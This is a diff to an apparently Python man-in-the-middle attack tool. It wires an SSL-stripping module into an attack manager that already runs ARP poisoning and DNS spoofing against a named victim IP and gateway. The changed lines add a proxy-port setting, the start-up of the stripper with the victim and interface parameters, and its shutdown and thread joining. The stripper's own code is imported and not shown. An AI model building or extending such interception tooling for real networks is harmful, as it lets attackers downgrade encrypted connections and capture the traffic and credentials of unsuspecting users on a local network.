@@ -19,6 +19,7 @@ import click
 
 from arp_poisoner import ARPPoisoner
 from dns_spoofer import DNSSpoofer, DNSMode
+from ssl_stripper import SSLStripper
 
 class AttackMode(Enum):
     """Available attack modes."""
@@ -42,6 +43,7 @@ class AttackConfig:
     dns_rules: dict[str, dict[str, str | None]] | None = None
     arp_interval: float = 2.0
     silent: bool = False
+    ssl_proxy_port: int = 8080
 
 
 class AttackManager:
@@ -55,7 +57,7 @@ class AttackManager:
 
         self._arp_poisoner: ARPPoisoner | None = None
         self._dns_spoofer: DNSSpoofer | None = None
-        # TO DO: ssl init
+        self._ssl_stripper: SSLStripper | None = None
 
         self._running = False
         self._original_sigint: Callable[[int, FrameType | None], Any] | int | None = None
@@ -131,8 +133,16 @@ class AttackManager:
                 )
                 self._dns_spoofer.start()
 
-            # TO DO
-            #if needs_ssl:
+            if needs_ssl:
+                click.echo(click.style(f"Initialising SSL stripper on port {self.config.ssl_proxy_port}...", fg="yellow"))
+                self._ssl_stripper = SSLStripper(
+                    iface=self.config.iface,
+                    victim_ip=self.config.victim_ip,
+                    gateway_ip=self.config.gateway_ip,
+                    https_port=self.config.ssl_proxy_port,
+                    silent=self.config.silent,
+                )
+                self._ssl_stripper.start()
 
             click.echo(click.style("Attack started successfully", fg="green", bold=True))
 
@@ -150,11 +160,19 @@ class AttackManager:
         click.echo(click.style("Stopping all attack modules...", fg="yellow"))
         self._running = False
 
+        # Stop in reverse order of startup
+        if self._ssl_stripper:
+            self._ssl_stripper.stop()
+
         if self._dns_spoofer:
             self._dns_spoofer.stop()
 
         if self._arp_poisoner:
             self._arp_poisoner.stop()
+
+        # Wait for threads to finish
+        if self._ssl_stripper:
+            self._ssl_stripper.join(timeout=5.0)
 
         if self._dns_spoofer:
             self._dns_spoofer.join(timeout=5.0)
